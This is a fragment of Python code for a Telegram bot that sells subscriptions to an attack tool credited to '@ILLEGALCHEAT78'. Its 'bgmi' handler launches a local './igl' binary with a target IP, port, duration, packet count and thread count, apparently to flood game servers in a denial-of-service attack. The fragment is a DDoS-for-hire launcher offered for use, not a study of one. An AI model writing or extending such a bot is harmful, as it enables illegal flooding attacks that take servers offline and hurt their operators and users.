...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in users:
        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @ILLEGALCHEAT78", reply_markup=main_menu_keyboard())
    else:
        expiration_date = users[user_id]
        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @ILLEGALCHEAT78", reply_markup=main_menu_keyboard())
...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    command = ['./igl', target_ip, str(port), str(duration),  str(DEFAULT_PACKET) ,str(DEFAULT_THREADS)]
    try:
